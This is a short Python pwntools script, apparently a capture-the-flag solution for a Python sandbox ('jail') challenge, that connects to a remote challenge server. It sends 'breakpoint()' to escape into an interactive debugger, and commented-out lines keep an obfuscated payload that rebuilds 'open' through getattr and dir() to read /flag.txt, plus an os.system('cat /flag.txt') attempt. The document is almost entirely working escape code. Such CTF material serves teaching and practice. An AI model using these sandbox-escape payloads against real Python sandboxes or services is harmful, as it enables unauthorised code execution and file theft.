
# exploit = "print(__builtins__.__dict__[getattr('OPEN', dir('OPEN')[59])()]('/FLAG.TXT'.lower()).read())"

from pwn import *

conn = remote('chal.sigpwny.com', 5016)

conn.recvline()


# import os; os.system("cat /flag.txt")

exploit = "breakpoint()"



conn.sendline(exploit.encode())
conn.interactive()